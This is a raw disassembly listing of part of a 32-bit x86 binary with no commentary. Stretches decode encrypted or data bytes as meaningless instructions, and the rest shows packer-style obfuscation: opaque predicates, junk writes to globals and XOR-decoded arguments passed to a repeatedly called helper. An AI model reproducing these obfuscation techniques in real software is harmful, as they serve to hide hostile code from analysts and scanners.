  4158d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158d4:	js     0x4158ec
  4158d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4158d7:	pop    ebp
  4158d8:	and    edi,DWORD PTR [edx+0x7dc6b65a]
  4158de:	adc    ebx,0xffffffcb
  4158e1:	neg    BYTE PTR [eax-0x21]
  4158e4:	mov    cl,0xe1
  4158e6:	xchg   ebx,eax
  4158e7:	retf   0x8f4b
  4158ea:	xchg   ebp,eax
  4158eb:	stos   DWORD PTR es:[edi],eax
  4158ec:	push   edx
  4158ed:	lahf   
  4158ee:	jns    0x415903
  4158f0:	mov    DWORD PTR [edx],ebx
  4158f2:	xchg   ebp,eax
  4158f3:	push   esi
  4158f4:	int3   
  4158f5:	adc    al,0x20
  4158f7:	test   DWORD PTR [esi+0x3320d6c8],ebp
  4158fd:	stos   BYTE PTR es:[edi],al
  4158fe:	jle    0x415954
  415900:	loop   0x41589a
  415902:	xor    ebx,eax
  415904:	mov    gs,WORD PTR [edx+0x273912d3]
  41590a:	adc    eax,0x564fa4ed
  41590f:	pop    ebp
  415910:	(bad)  
  415911:	jnp    0x415978
  415913:	rol    DWORD PTR [edi+0x69],cl
  415916:	adc    ch,BYTE PTR [esi+edi*1]
  415919:	loop   0x415994
  41591b:	loopne 0x415904
  41591d:	mov    ah,0x2f
  41591f:	or     ah,ch
  415921:	ds clc 
  415923:	leave  
  415924:	xor    cl,BYTE PTR [edi+edx*8]
  415927:	push   eax
  415928:	mov    al,ds:0x9a9f8436
  41592d:	fmul   DWORD PTR [ebx+eiz*2]
  415930:	das    
  415931:	imul   cl
  415933:	sbb    esp,ebp
  415935:	adc    esp,ebp
  415937:	mov    ss,WORD PTR [ecx+0x5ac2f241]
  41593d:	add    esp,DWORD PTR [eax]
  41593f:	jmp    0xff85c4b6
  415944:	bound  edi,QWORD PTR [eax-0x367a0c50]
  41594a:	test   eax,0x6db4157
  41594f:	das    
  415950:	mov    WORD PTR [ebx-0x75c9034f],fs
  415956:	sbb    al,0x7d
  415958:	je     0x415988
  41595a:	jp     0x41596f
  41595c:	fldcw  WORD PTR [eax]
  41595e:	fxch   st(4)
  415960:	and    ebp,DWORD PTR [eax]
  415962:	nop
  415963:	not    esp
  415965:	push   0xffffffd3
  415967:	daa    
  415968:	push   eax
  415969:	je     0x41591d
  41596b:	clc    
  41596c:	add    ebp,ebp
  41596e:	shl    DWORD PTR [edi],1
  415970:	mov    dh,0x16
  415972:	jl     0x41596f
  415974:	popa   
  415975:	bound  edi,QWORD PTR [esi-0x13cda271]
  41597b:	and    ebp,DWORD PTR [edi+0x118df6f3]
  415981:	push   ds
  415982:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415983:	imul   DWORD PTR [bp+si+0x25]
  415987:	add    ebp,esp
  415989:	arpl   dx,di
  41598b:	cmp    al,0xfb
  41598d:	in     ax,dx
  41598f:	mov    dl,0xc9
  415991:	ss std 
  415993:	ss jmp 0x4159b2
  415996:	scas   eax,DWORD PTR es:[edi]
  415997:	add    dl,BYTE PTR [esi]
  415999:	xor    eax,DWORD PTR [ebx-0x70b34d55]
  41599f:	mov    dl,0x65
  4159a1:	(bad)  
  4159a2:	aam    0x85
  4159a4:	jb     0x415953
  4159a6:	aad    0x9b
  4159a8:	rcl    DWORD PTR [esi-0x2d],cl
  4159ab:	add    al,0x41
  4159ad:	sar    BYTE PTR [edi],cl
  4159af:	adc    ebx,DWORD PTR [eax]
  4159b1:	jmp    0x4159bd
  4159b3:	into   
  4159b4:	loopne 0x41594e
  4159b6:	repz jle 0x415a34
  4159b9:	icebp  
  4159ba:	sar    DWORD PTR [edx-0x1f],cl
  4159bd:	ja     0x415993
  4159bf:	xor    al,0x8b
  4159c1:	inc    ebp
  4159c2:	loopne 0x4159f7
  4159c4:	ror    BYTE PTR [ebx-0x2fdc23bb],1
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x42825b,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x428397,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42822b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x42818b,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x4282ef
  415a48:	cmp    DWORD PTR ds:0x42822b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428ee4
  415a74:	mov    edi,DWORD PTR ds:0x4281bf
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x4281df
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x428177
  415a8f:	and    DWORD PTR ds:0x4283a3,edx
  415a95:	xor    DWORD PTR ds:0x428243,0x17b
  415a9f:	sbb    DWORD PTR ds:0x4282f7,ecx
  415aa5:	adc    DWORD PTR ds:0x42816b,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x428173
  415ac7:	xor    DWORD PTR ds:0x42829f,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x4281ef
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282ab
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x428383,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42824f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x4281cf
  415b25:	mov    edx,DWORD PTR ds:0x42821f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x42838f,0x0
  415b3a:	not    DWORD PTR ds:0x428313
  415b40:	mov    DWORD PTR ds:0x42826b,0x4d0
  415b4a:	mov    DWORD PTR ds:0x428163,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x428373,0x25ca
  415b63:	cmp    DWORD PTR ds:0x42838f,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x42815b
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428e7c
  415b83:	add    DWORD PTR ds:0x42836b,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42831f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x4282eb
  415ba0:	adc    DWORD PTR ds:0x428327,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x42817f,0x0
  415bb5:	mov    DWORD PTR ds:0x428177,0x74bf
  415bbf:	mov    DWORD PTR ds:0x4282f7,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x42817f,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x428257
  415bef:	call   DWORD PTR ds:0x428e80
  415bf5:	sub    edi,DWORD PTR ds:0x4283a3
  415bfb:	sbb    DWORD PTR ds:0x428327,ecx
  415c01:	and    edx,DWORD PTR ds:0x428197
  415c07:	mov    edi,DWORD PTR ds:0x42823f
  415c0d:	and    DWORD PTR ds:0x42817b,edi
  415c13:	or     DWORD PTR ds:0x428173,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281a3
  415c23:	mov    edx,DWORD PTR ds:0x42832b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x42836f,0x0
  415c38:	mov    DWORD PTR ds:0x42839b,ebx
  415c3e:	mov    DWORD PTR ds:0x42816f,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x42818b,edx
  415c4f:	cmp    DWORD PTR ds:0x42836f,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42830b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428dd0
  415c88:	mov    edi,DWORD PTR ds:0x4281c7
  415c8e:	mov    edx,DWORD PTR ds:0x42834f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428327,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42823f
  415cab:	mov    eax,ds:0x4223d8
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x4225f8
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x42838b,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x42827b
  415cd7:	mov    ebx,DWORD PTR ds:0x4283a3
  415cdd:	mov    DWORD PTR ds:0x428243,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x42837b,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x42838b,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428dd4
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x428267
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x42827f,0x428263
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42830f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428327,0x0
  415d58:	mov    DWORD PTR ds:0x428283,0x5216
  415d62:	not    DWORD PTR ds:0x42825b
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x42827b,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x42829b,ebx
  415d82:	cmp    DWORD PTR ds:0x428327,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x4280bb
  415d94:	push   0x428069
  415d99:	call   DWORD PTR ds:0x428dd8
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x42827f
  415dab:	sbb    DWORD PTR ds:0x4283a3,edx
  415db1:	or     DWORD PTR ds:0x428383,ebx
  415db7:	sbb    DWORD PTR ds:0x4282a3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42831f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x42815f,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x428157,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x42819b,0x428163
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x42819b,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x42836f,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x428277,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282a3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42824f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x42827f,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428307,0x42818f
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x428173,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42831f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x42818f,0x1988
  415e9d:	mov    DWORD PTR ds:0x428297,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x428173,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428ddc
  415ec4:	or     DWORD PTR ds:0x428233,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x42836b,0x174
  415ede:	mov    DWORD PTR ds:0x42838f,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x42838b
  415eee:	add    edx,DWORD PTR ds:0x42816f
  415ef4:	mov    DWORD PTR ds:0x42838b,edx
  415efa:	or     DWORD PTR ds:0x428377,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428327
  415f06:	or     DWORD PTR ds:0x428287,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x428297,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42831f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x428153,0x0
  415f3b:	mov    DWORD PTR ds:0x428177,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x428377
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428317,ebx
  415f59:	cmp    DWORD PTR ds:0x428153,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428ee8
  415f91:	xor    DWORD PTR ds:0x4283a7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x428283
  415f9d:	sub    DWORD PTR ds:0x42823f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x42837b
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428323
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x428373,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x42818b,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x42818b
  415fdc:	add    DWORD PTR ds:0x428273,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42823f,0x0
  415fec:	mov    DWORD PTR ds:0x428393,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283a7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x428373,0x1cd3
  416015:	mov    DWORD PTR ds:0x42816f,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42823f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428eec
  416037:	add    DWORD PTR ds:0x428173,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428317,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42824f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428247
  41605c:	adc    DWORD PTR ds:0x42826b,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x42839b,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428307,0x42827f
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x42818f,0x0
  416089:	mov    DWORD PTR ds:0x428327,0x1e83
  416093:	mov    DWORD PTR ds:0x428383,edx
  416099:	movzx  ecx,WORD PTR ds:0x42825b
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x428193
  4160ad:	cmp    DWORD PTR ds:0x42818f,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428de0
  4160c6:	adc    DWORD PTR ds:0x42831b,edi
  4160cc:	or     DWORD PTR ds:0x42825b,0x4a59
  4160d6:	mov    ecx,DWORD PTR ds:0x42822f
  4160dc:	sub    DWORD PTR ds:0x42818b,ecx
  4160e2:	add    DWORD PTR ds:0x42827f,0x16e5
  4160ec:	dec    ecx
  4160ed:	mov    DWORD PTR [ebp-0x34],eax
  4160f0:	mov    eax,ds:0x422558
  4160f5:	and    ecx,DWORD PTR ds:0x42826f
  4160fb:	mov    DWORD PTR [ebp-0x34],eax
  4160fe:	mov    eax,DWORD PTR [ebp-0xc]
  416101:	mov    DWORD PTR [ebp-0x14],eax
  416104:	xor    DWORD PTR ds:0x42837b,ecx
  41610a:	mov    ecx,DWORD PTR [ebp-0x14]
  41610d:	or     DWORD PTR ds:0x428393,0x5817
  416117:	push   0x4
  416119:	cmp    DWORD PTR ds:0x42818b,0x0
  416120:	mov    DWORD PTR ds:0x428373,0x7b16
  41612a:	mov    DWORD PTR ds:0x42818f,0x195b
  416134:	jmp    0x41618b
  416139:	mov    DWORD PTR ds:0x42826b,0x5f2a
  416143:	cmp    DWORD PTR ds:0x42818b,0x0
  41614a:	jle    0x41616d
  416150:	push   DWORD PTR [ebp-0x20]
  416153:	call   DWORD PTR ds:0x428ef0
  416159:	xor    DWORD PTR ds:0x428167,0x42815b
  416163:	sub    DWORD PTR ds:0x428153,0x42817f
  41616d:	sbb    DWORD PTR ds:0x42828f,0x428287
  416177:	and    DWORD PTR ds:0x42827f,0x56d1
  416181:	xor    DWORD PTR ds:0x42826b,0x1431
  41618b:	pop    eax
  41618c:	or     DWORD PTR ds:0x42825f,0x42819b
  416196:	sub    eax,ecx
  416198:	mov    ecx,DWORD PTR [ebp-0x10]
  41619b:	add    ecx,eax
  41619d:	mov    DWORD PTR [ebp-0x24],ecx
  4161a0:	mov    ecx,DWORD PTR ds:0x42820f
  4161a6:	mov    ecx,DWORD PTR [ecx]
  4161a8:	sbb    DWORD PTR ds:0x428193,ecx
  4161ae:	lea    eax,[ebp-0x30]
  4161b1:	mov    DWORD PTR [ebp-0x2c],eax
  4161b4:	and    eax,0x1e1b
  4161b9:	mov    eax,DWORD PTR [ebp-0x1c]
  4161bc:	mov    ecx,DWORD PTR [ebp-0x1c]
  4161bf:	xor    eax,edi
  4161c1:	xor    ecx,ebx
  4161c3:	sub    DWORD PTR ds:0x42818b,0x428267
  4161cd:	shr    eax,0x2
  4161d0:	and    DWORD PTR ds:0x42828b,0x42824b
  4161da:	shl    ecx,0x1e
  4161dd:	sbb    DWORD PTR ds:0x428317,0x42822b
  4161e7:	or     eax,ecx
  4161e9:	or     DWORD PTR ds:0x428283,0x697f
  4161f3:	mov    DWORD PTR [ebp-0x20],eax
  4161f6:	mov    DWORD PTR [ebp-0x8],0xa4069abe
  4161fd:	mov    eax,DWORD PTR [ebp-0x8]
  416200:	mov    ecx,DWORD PTR [ebp-0x8]
  416203:	xor    eax,edi
  416205:	xor    ecx,ebx
  416207:	shr    eax,0x2
  41620a:	shl    ecx,0x1e
  41620d:	or     ecx,eax
  41620f:	push   ecx
  416210:	lea    eax,[ebp-0x8]
  416213:	push   eax
  416214:	lea    eax,[ebp-0x7c]
  416217:	push   eax
  416218:	call   0x415231
  41621d:	mov    eax,DWORD PTR [ebp-0x8]
  416220:	mov    ecx,DWORD PTR [ebp-0x8]
  416223:	xor    eax,edi
  416225:	xor    ecx,ebx
  416227:	shr    eax,0x2
  41622a:	shl    ecx,0x1e
  41622d:	or     ecx,eax
  41622f:	push   ecx
  416230:	lea    eax,[ebp-0x14]
  416233:	push   eax
  416234:	mov    eax,DWORD PTR [ebp+0x8]
  416237:	mov    ecx,DWORD PTR [ebp+0xc]
  41623a:	shrd   eax,ecx,0x2
  41623e:	shr    ecx,0x2
  416241:	mov    ecx,DWORD PTR [ebp+0x8]
  416244:	mov    edx,DWORD PTR [ebp+0xc]
  416247:	xor    eax,esi
  416249:	xor    edx,edx
  41624b:	or     eax,edx
  41624d:	lea    eax,[ebp+eax*4-0x78]
  416251:	push   eax
  416252:	shl    ecx,0x1e
  416255:	call   0x415231
  41625a:	mov    eax,DWORD PTR [ebp-0x8]
  41625d:	mov    ecx,DWORD PTR [ebp-0x8]
  416260:	xor    eax,edi
  416262:	xor    ecx,ebx
  416264:	shr    eax,0x2
  416267:	shl    ecx,0x1e
  41626a:	or     ecx,eax
  41626c:	push   ecx
  41626d:	lea    eax,[ebp-0x24]
  416270:	push   eax
  416271:	mov    eax,DWORD PTR [ebp+0x10]
  416274:	mov    ecx,DWORD PTR [ebp+0x14]
  416277:	shrd   eax,ecx,0x2
  41627b:	shr    ecx,0x2
  41627e:	mov    ecx,DWORD PTR [ebp+0x10]
  416281:	mov    edx,DWORD PTR [ebp+0x14]
  416284:	xor    eax,esi
  416286:	xor    edx,edx
  416288:	or     eax,edx
  41628a:	lea    eax,[ebp+eax*4-0x78]
  41628e:	push   eax
  41628f:	shl    ecx,0x1e
  416292:	call   0x415231
  416297:	mov    eax,DWORD PTR [ebp-0x8]
  41629a:	mov    ecx,DWORD PTR [ebp-0x8]
  41629d:	xor    ecx,ebx
  41629f:	xor    eax,edi
  4162a1:	shl    ecx,0x1e
  4162a4:	shr    eax,0x2
  4162a7:	or     ecx,eax
  4162a9:	push   ecx
  4162aa:	lea    eax,[ebp-0x20]
  4162ad:	push   eax
  4162ae:	mov    eax,DWORD PTR [ebp+0x10]
  4162b1:	mov    ecx,DWORD PTR [ebp+0x14]
  4162b4:	shrd   eax,ecx,0x2
  4162b8:	shr    ecx,0x2
  4162bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4162be:	mov    edx,DWORD PTR [ebp+0x14]
  4162c1:	xor    edx,edx
  4162c3:	xor    eax,esi
  4162c5:	or     eax,edx
  4162c7:	shl    ecx,0x1e
  4162ca:	mov    ecx,DWORD PTR [ebp+0x10]
  4162cd:	mov    edx,DWORD PTR [ebp+0x14]
  4162d0:	shrd   ecx,edx,0x2
  4162d4:	shr    edx,0x2
  4162d7:	mov    edx,DWORD PTR [ebp+0x10]
  4162da:	mov    ebx,DWORD PTR [ebp+0x14]
  4162dd:	xor    ecx,esi
  4162df:	xor    ebx,ebx
  4162e1:	or     ecx,ebx
  4162e3:	add    eax,ecx
  4162e5:	lea    eax,[ebp+eax*4-0x78]
  4162e9:	push   eax
  4162ea:	shl    edx,0x1e
  4162ed:	call   0x415231
  4162f2:	mov    eax,DWORD PTR [ebp-0x8]
  4162f5:	mov    ecx,DWORD PTR [ebp-0x8]
  4162f8:	xor    ecx,0xfffffffe
  4162fb:	shl    ecx,0x1e
  4162fe:	jmp    0x41655e
  416303:	sbb    eax,0x26add60b
  416308:	lods   eax,DWORD PTR ds:[esi]
  416309:	sbb    bh,BYTE PTR [edx-0x45]
  41630c:	xor    bl,BYTE PTR [ebx+0x70]
  41630f:	mov    ah,0xa0
  416311:	jne    0x41638f
  416313:	hlt    
  416314:	add    BYTE PTR [esi],dl
  416316:	sbb    BYTE PTR [ebx+0x4f181814],bl
  41631c:	inc    ecx
  41631d:	sbb    esi,0x2fe16f19
  416323:	add    al,0xf
  416325:	out    dx,al
  416326:	and    eax,0xd85183f1
  41632b:	stos   DWORD PTR es:[edi],eax
  41632c:	nop
  41632d:	in     al,0x2
  41632f:	pop    es
  416330:	push   edi
  416331:	add    eax,0xf210552e
  416336:	inc    ebp
  416337:	sti    
  416338:	mov    DWORD PTR [esi-0xa729381],ebx
  41633e:	mov    edx,0xe3a20983
  416343:	add    BYTE PTR [eax+ebp*1-0x1a],bh
  416347:	mov    bl,0xc
  416349:	push   0x1b
  41634b:	ffree  st(0)
  41634d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41634e:	xchg   edx,eax
  41634f:	jb     0x4162e3
  416351:	inc    esi
  416352:	hlt    
  416353:	mov    ecx,0x9025dc55
  416358:	test   BYTE PTR [eax+0x1c577882],dh
  41635e:	ret    0x39c3
  416361:	jge    0x4163b8
  416363:	pop    edi
  416364:	mov    ds:0x307a34a8,al
  416369:	and    al,0x4b
  41636b:	or     al,0x68
  41636d:	jge    0x416371
  41636f:	mov    cl,0x88
  416371:	stos   DWORD PTR es:[edi],eax
  416372:	test   al,0xd2
  416374:	(bad)  
  416375:	test   al,0x8a
  416377:	cmp    al,0x1e
  416379:	inc    esi
  41637a:	shl    BYTE PTR [esi],cl
  41637c:	pop    esp
  41637d:	mov    edi,0x7bf5fa53
  416382:	push   esp
  416383:	inc    edx
  416384:	dec    esi
  416385:	pop    edi
  416386:	cld    
  416387:	aaa    
  416388:	inc    edx
  416389:	mov    es,WORD PTR [esi+0x4ad1ea02]
  41638f:	fiadd  DWORD PTR [edi+0x20db4505]
  416395:	test   eax,0xa1d256b2
  41639a:	lock mov ecx,0x43be42bd
  4163a0:	dec    esi
  4163a1:	jne    0x416370
  4163a3:	or     DWORD PTR [ebp-0x48],0x9dd8deeb
  4163aa:	xchg   edi,eax
  4163ab:	inc    ebp
  4163ac:	xchg   ecx,eax
  4163ad:	stc    
  4163ae:	xor    dl,BYTE PTR [eax+0x20]
  4163b1:	out    0x14,al
  4163b3:	arpl   dx,sp
  4163b5:	fmul   DWORD PTR [edi+eiz*4-0x2cf3654]
  4163bc:	xchg   edx,eax
  4163bd:	add    al,0x9b
  4163bf:	or     bh,BYTE PTR [eax-0x1b]
  4163c2:	lea    esi,[ebp-0x7]
  4163c5:	cmp    BYTE PTR [esi+0xe],bl
  4163c8:	inc    ecx
  4163c9:	lods   eax,DWORD PTR ds:[esi]
  4163ca:	xor    BYTE PTR [ecx+0x7669cba1],0x50
  4163d1:	dec    esp
  4163d2:	(bad)  
  4163d3:	sub    dh,BYTE PTR [edi]
  4163d5:	dec    ch
  4163d7:	sbb    ax,0xafe9
